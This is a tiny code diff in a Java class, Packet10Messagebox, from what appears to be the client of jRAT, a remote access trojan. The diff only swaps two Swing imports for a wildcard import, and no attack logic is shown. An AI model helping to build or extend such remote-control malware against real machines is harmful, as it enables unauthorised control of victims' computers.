@@ -2,8 +2,8 @@ package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
 import jrat.common.Constants;
-import javax.swing.JOptionPane;
-import javax.swing.UIManager;
+
+import javax.swing.*;
 
 
 public class Packet10Messagebox extends AbstractIncomingPacket {
